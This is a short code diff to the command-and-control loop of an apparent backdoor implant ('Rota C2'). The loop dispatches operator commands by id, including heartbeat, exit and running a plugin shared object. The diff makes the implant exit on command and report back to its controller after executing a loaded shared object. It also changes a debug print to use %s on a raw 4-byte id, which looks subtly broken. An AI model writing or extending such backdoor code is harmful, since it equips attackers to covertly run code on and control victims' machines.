@@ -131,6 +131,7 @@ void c2_loop() {
             printf("[+] Rota C2 Run exiting!\n");
             #endif
             c2_exit(cmd_id, sock2);
+            exit(0);
         }
         else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
             c2_heartbeat(cmd_id, sock);
@@ -277,10 +278,12 @@ void c2_loop() {
         }
         else if (memcmp(&rota_c2_run_plugin_1, cmd_id, 4) == 0) {
             c2_run_plugin_1(payload);
+            char *msg = "Shared Object Executed!";
+            build_c2_response(msg, cmd_id, sock2);
 
         } else {
             #ifdef DEBUG
-            printf("Unknown command id %20x\n", cmd_id);
+            printf("Unknown command id %s\n", cmd_id);
             #endif
         }
 
